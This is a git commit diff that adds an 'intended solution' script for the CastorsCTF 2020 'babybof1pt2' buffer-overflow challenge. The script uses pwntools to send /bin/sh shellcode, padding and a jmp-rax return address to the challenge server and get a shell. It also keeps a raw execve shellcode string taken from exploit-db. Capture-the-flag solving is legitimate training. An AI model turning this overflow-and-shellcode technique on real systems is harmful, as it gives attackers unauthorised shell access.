37f544a83f2e6d5b498f0778311e3662634c4a43
RazviOverflow <razvioverflow@gmail.com>
2020-06-01 02:29:32 -0400

    Added intended solution

--- CASTORSCTF2020/BABYBOF1PT2/intended_solution.py
+++ CASTORSCTF2020/BABYBOF1PT2/intended_solution.py
@@ -1,8 +1,23 @@
 # RazviOverflow
 # Python3
 
-from pwn import *
+# _________________________________
 
+from pwn import *
+p = remote('chals20.cybercastors.com', 14425)
+#p = process('./babybof')
+
+sc = asm(shellcraft.amd64.sh(), arch='amd64')
+jmp_rax = p64(0x0000000000400661)
+junk = 'A' * (264 - len(sc))
+payload = sc + junk + jmp_rax
+
+p.sendline(payload)
+p.interactive()
+
+# _________________________________
+
+from pwn import *
 # From https://www.exploit-db.com/exploits/41757
 shellcode = b"\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
 
